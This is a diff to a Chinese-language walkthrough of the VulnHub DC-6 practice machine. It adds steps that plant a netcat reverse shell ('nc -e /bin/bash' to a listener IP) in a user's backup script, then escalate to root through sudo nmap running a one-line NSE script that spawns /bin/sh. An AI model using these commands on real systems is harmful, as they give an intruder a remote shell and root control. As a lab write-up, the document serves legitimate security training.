@@ -6,6 +6,8 @@
 
 ## 知识点
 
+- suid-nmap提权
+
 ## 信息收集
 
 ```bash
@@ -96,7 +98,31 @@ sudo -l
 
 ![image](./img/vulnhub-dc6-9.png)
 
+```bash
+vi /home/jens/backups.sh # 注释，添加反弹shell
+# nc -e /bin/bash 10.30.0.81 6666
+nc -lvnp 6666  # kali
+```
 
+![image](./img/vulnhub-dc6-10.png)
+
+成功切换到jens
+
+- https://gtfobins.github.io 查找nmap提权
+
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'
+sudo -l  # nmap提权
+# 提权思路： 将root权限bin/sh写入脚本插件，使用nmap运行脚本插件使用namp执行脚本，执行命令不会显示命令，建议使用python交互shell后更直观，提权成功
+nmap -v
+
+echo 'os.execute("/bin/sh")' > /tmp/root.nse
+cat /tmp/root.nse
+sudo nmap --script=/tmp/root.nse
+whoami
+```
+
+![image](./img/vulnhub-dc6-11.png)
 ## 参考链接
 - https://github.com/ffffffff0x/1earn/blob/004fbc731d7ce8004b9c2a38613d39f71cd8cb6e/1earn/Security/%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E9%9D%B6%E6%9C%BA/VulnHub/DC/DC6-WalkThrough.md
 - http://www.kxsy.work/2021/07/30/shen-tou-dc-6/
